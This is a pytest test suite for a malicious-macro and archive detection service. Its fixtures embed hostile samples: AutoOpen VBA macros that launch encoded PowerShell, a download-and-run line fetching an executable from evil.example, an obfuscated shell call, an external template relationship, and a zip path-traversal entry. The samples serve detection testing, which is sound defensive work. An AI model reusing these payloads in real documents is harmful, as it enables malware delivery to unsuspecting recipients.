import builtins
import io
import sys
import zipfile
from pathlib import Path

import pytest
from starlette.datastructures import UploadFile

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from backend.services.alerts_service import AlertsService
from backend.services.file_analysis_service import FileAnalysisService


class FakeSession:
    def add(self, obj):
        return None

    def commit(self):
        return None

    def refresh(self, obj):
        return None

    def rollback(self):
        return None


def _service() -> FileAnalysisService:
    try:
        return FileAnalysisService.get_instance()
    except RuntimeError:
        models_store = ROOT / "backend" / "data" / "models_store"
        yara_rules = ROOT / "backend" / "yara_rules" / "basic_rules.yar"
        return FileAnalysisService(
            ml_model_path=str(models_store / "file_analyzer_v1.joblib"),
            yara_rules_path=str(yara_rules),
            alerts_service=AlertsService(),
        )


def _zip_bytes(entries: dict[str, bytes | str]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, payload in entries.items():
            data = payload.encode("utf-8") if isinstance(payload, str) else payload
            zf.writestr(name, data)
    return buffer.getvalue()


async def _scan(filename: str, payload: bytes, **kwargs):
    svc = _service()
    return await svc.analyze_file(
        FakeSession(),
        UploadFile(file=io.BytesIO(payload), filename=filename),
        **kwargs,
    )


@pytest.mark.asyncio
async def test_ooxml_macro_container_detected_and_routed_to_review():
    payload = _zip_bytes(
        {
            "[Content_Types].xml": "<Types></Types>",
            "word/document.xml": "Quarterly finance workbook",
            "word/vbaProject.bin": "Sub FormatReport()\nEnd Sub",
        }
    )

    result = await _scan("finance_template.docm", payload)

    macro = result["macro_defense"]
    overall = result["overall_assessment"]
    assert macro["macro_present"] is True
    assert macro["macro_container_type"] == "ooxml_vba_project"
    assert macro["macro_risk_level"] in {"medium", "low"}
    assert macro["recommended_handling"] in {"review", "monitor"}
    assert overall["recommended_action"] in {"FLAG_FOR_REVIEW", "ALLOW_UPLOAD"}
    assert "blocked" not in str(overall["overall_status"]).lower()


@pytest.mark.asyncio
async def test_non_macro_ooxml_extension_with_vbaproject_is_high_risk():
    payload = _zip_bytes(
        {
            "[Content_Types].xml": "<Types></Types>",
            "word/document.xml": "Invoice",
            "word/vbaProject.bin": "Sub AutoOpen()\nEnd Sub",
        }
    )

    result = await _scan("invoice.docx", payload)

    macro = result["macro_defense"]
    overall = result["overall_assessment"]
    assert macro["macro_present"] is True
    assert macro["macro_risk_score"] >= 0.85
    assert any("non-macro OOXML extension" in r for r in macro["evidence_reasons"])
    assert overall["risk_score"] >= 0.85
    assert overall["recommended_action"] == "BLOCK_REQUEST"


@pytest.mark.asyncio
async def test_benign_macro_container_is_not_treated_as_malware():
    payload = _zip_bytes(
        {
            "[Content_Types].xml": "<Types></Types>",
            "xl/workbook.xml": "Business report template",
            "xl/vbaProject.bin": "Sub FormatReport()\nRange(\"A1\").Font.Bold = True\nEnd Sub",
        }
    )

    result = await _scan("report.xlsm", payload)

    macro = result["macro_defense"]
    overall = result["overall_assessment"]
    assert macro["macro_present"] is True
    assert macro["macro_risk_level"] == "medium"
    assert macro["recommended_handling"] == "review"
    assert overall["recommended_action"] == "FLAG_FOR_REVIEW"
    assert overall["risk_score"] < 0.80
    assert "Critical" not in overall["overall_status"]


@pytest.mark.asyncio
async def test_autoopen_wscript_powershell_macro_is_critical():
    payload = _zip_bytes(
        {
            "[Content_Types].xml": "<Types></Types>",
            "word/document.xml": "Urgent invoice",
            "word/vbaProject.bin": (
                'Sub AutoOpen()\n'
                'CreateObject("WScript.Shell").Run "powershell.exe -EncodedCommand AAA="\n'
                "End Sub"
            ),
        }
    )

    result = await _scan("invoice.docm", payload)

    macro = result["macro_defense"]
    overall = result["overall_assessment"]
    assert macro["macro_risk_level"] == "critical"
    assert macro["macro_risk_score"] >= 0.92
    assert {"AutoOpen", "WScript.Shell", "powershell"}.intersection(set(macro["macro_indicators"]))
    assert overall["overall_status"] == "Critical Macro Behaviour Detected"
    assert overall["risk_score"] >= 0.92
    assert overall["recommended_action"] == "BLOCK_REQUEST"


@pytest.mark.asyncio
async def test_network_download_macro_is_critical():
    payload = _zip_bytes(
        {
            "[Content_Types].xml": "<Types></Types>",
            "word/document.xml": "Invoice",
            "word/vbaProject.bin": (
                'Sub AutoOpen()\n'
                'URLDownloadToFile 0, "https://evil.example/a.exe", "a.exe", 0, 0\n'
                'Shell("cmd.exe /c a.exe")\n'
                "End Sub"
            ),
        }
    )

    result = await _scan("invoice.docm", payload)

    macro = result["macro_defense"]
    assert macro["macro_risk_level"] == "critical"
    assert macro["macro_risk_score"] >= 0.92
    assert "URLDownloadToFile" in macro["network_indicators"]


@pytest.mark.asyncio
async def test_obfuscated_execution_macro_is_high_or_critical():
    payload = _zip_bytes(
        {
            "[Content_Types].xml": "<Types></Types>",
            "word/vbaProject.bin": 'Sub AutoOpen()\nShell(StrReverse("exe.llehsrewop"))\nEnd Sub',
        }
    )

    result = await _scan("payload.docm", payload)

    macro = result["macro_defense"]
    assert macro["macro_risk_level"] in {"high", "critical"}
    assert macro["macro_risk_score"] >= 0.85
    assert "StrReverse" in macro["obfuscation_indicators"]


@pytest.mark.asyncio
async def test_external_template_relationship_is_high_risk():
    payload = _zip_bytes(
        {
            "[Content_Types].xml": "<Types></Types>",
            "word/document.xml": "Document",
            "word/_rels/settings.xml.rels": (
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                '<Relationship Id="rId1" Type="attachedTemplate" TargetMode="External" '
                'Target="https://evil.example/template.dotm"/></Relationships>'
            ),
        }
    )

    result = await _scan("letter.docx", payload)

    macro = result["macro_defense"]
    assert macro["macro_risk_level"] == "high"
    assert macro["macro_risk_score"] >= 0.80
    assert macro["recommended_handling"] == "block_request"
    assert any("External template/relationship" in r for r in macro["evidence_reasons"])


def test_oletools_unavailable_fails_gracefully(monkeypatch):
    svc = _service()
    real_import = builtins.__import__

    def fake_import(name, *args, **kwargs):
        if str(name).startswith("oletools"):
            raise ImportError("oletools unavailable in test")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", fake_import)
    payload = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b" AutoOpen WScript.Shell powershell"
    details = svc._legacy_ole_macro_scan(payload)

    assert details["macro_present"] is True
    assert details["macro_risk_score"] >= 0.80
    assert any("oletools is not installed" in item for item in details["limitations"])


@pytest.mark.asyncio
async def test_signed_trusted_benign_macro_is_lower_risk_but_still_scanned():
    payload = _zip_bytes(
        {
            "[Content_Types].xml": "<Types></Types>",
            "word/vbaProject.bin": "Sub FormatReport()\nEnd Sub",
        }
    )

    result = await _scan(
        "signed-template.docm",
        payload,
        source_metadata={"signed_macro": True, "trusted_publisher": True, "source_trust": "trusted"},
    )

    macro = result["macro_defense"]
    assert macro["macro_present"] is True
    assert macro["macro_risk_score"] <= 0.35
    assert macro["recommended_handling"] in {"monitor", "allow"}


@pytest.mark.asyncio
async def test_signed_trusted_macro_with_powershell_stays_high_risk():
    payload = _zip_bytes(
        {
            "[Content_Types].xml": "<Types></Types>",
            "word/vbaProject.bin": 'Sub AutoOpen()\nShell("powershell -enc AAA=")\nEnd Sub',
        }
    )

    result = await _scan(
        "signed-malicious.docm",
        payload,
        source_metadata={"signed_macro": True, "trusted_publisher": True, "source_trust": "trusted"},
    )

    macro = result["macro_defense"]
    assert macro["macro_risk_score"] >= 0.90
    assert macro["macro_risk_level"] == "critical"


@pytest.mark.asyncio
async def test_zip_path_traversal_is_controlled():
    payload = _zip_bytes({"../evil.txt": "not extracted", "word/document.xml": "normal"})

    result = await _scan("archive.zip", payload)

    archive = ((result["file_details"]["malware_scan"].get("scan_details") or {}).get("archive") or {})
    assert archive["suspicious"] is True
    assert "path_traversal_entry" in archive["suspicious_reasons"]


@pytest.mark.asyncio
async def test_email_macro_lure_text_does_not_claim_actual_file_macro_scan():
    payload = b"Please open the attached invoice and enable macros to view protected content."

    result = await _scan("email-lure.txt", payload)

    macro = result["macro_defense"]
    assert macro["macro_present"] is False
    assert macro["macro_risk_score"] == 0.0
    assert "Attachment lure" not in " ".join(macro["evidence_reasons"])
